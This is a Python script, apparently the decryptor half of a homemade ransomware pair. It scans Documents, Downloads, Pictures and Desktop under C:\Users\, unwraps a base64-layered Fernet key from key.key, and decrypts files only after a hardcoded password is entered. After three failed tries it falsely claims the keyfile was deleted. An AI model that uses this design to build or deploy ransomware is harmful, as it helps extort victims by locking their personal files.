import os, base64, time
from cryptography.fernet import Fernet

def decrypt():
    # Scan files in current folder and add to array
    files_ar = []  # array for all files in folder
    no_encrypt = ["encrypt.py", "decrypt.py", "key.key", "encrypt.exe", "decrypt.exe"]
    rootdir = "C:\\Users\\"
    exclude = ["All Users", "Default", "Default User", "desktop.ini", "Public", "niels"]
    standard_folders = ["Documents", "Downloads", "Pictures", "Desktop"]
    folders = []
    for folder in os.listdir(rootdir):
        if folder in exclude:
            continue
        else:
            folders.append(folder)

    print("folders array:", folders)
    for folder in folders:  # opens user folder
        for all_user_folders in os.listdir(rootdir + folder):  # reads all folders within user folder
            if all_user_folders not in standard_folders:
                continue  # if folder is not standard, don't touch, skip
            else:
                for root, dirs, files in os.walk(rootdir + folder + "\\" + all_user_folders):
                    for file in files:
                        file2 = os.path.join(root, file)
                        if file in no_encrypt: continue  # skip these files
                        if os.path.isfile(file2):  # if file add to array
                            files_ar.append(file2)

    # read keyfile and decrypt key
    with open("key.key", "rb") as key: secret_key = key.read()
    i = 1
    while i <= 5:
        secret_key = base64.b64decode(secret_key)
        i = i + 1

    # decrypt files
    try:
        for file in files_ar:
            with open(file, "rb")as thefile:
                contents = thefile.read()
                bas_decrypted = base64.b64decode(contents)
                contents_decrypted = Fernet(secret_key).decrypt(bas_decrypted)
            with open(file, "wb") as thefile: thefile.write(contents_decrypted)
    except: print("failed")


# enter password before decryption.
key = "cnhU-NAeF-OsVSUrksfRzzMq_zyZbBlQMI3za0Hv4Ww=".encode("utf-8")
passwd = "gAAAAABimMtjNnSA6K3wvcMVKMIlL1s9-ms1eJwUyfg_vOhhQqTH7vhocyxRuunZ3ThsIPa35Wg5J-od5vvvzh90t8QefnU49w==".encode("utf-8")
passwd_dc = Fernet(key).decrypt(passwd).decode("utf-8")
count = 3
while True:
    user_input = input("Enter the super secret password:\n -> ")
    if user_input == passwd_dc:
        print("Password correct, your files are now decrypted.")
        decrypt()
        time.sleep(1)
        exit()
    else:
        if count <= 1:
            print("the keyfile has been deleted.")
            exit()
        else:
            count = count - 1
            print("try again\n\n")
            print("You have ", count, " chances left...")
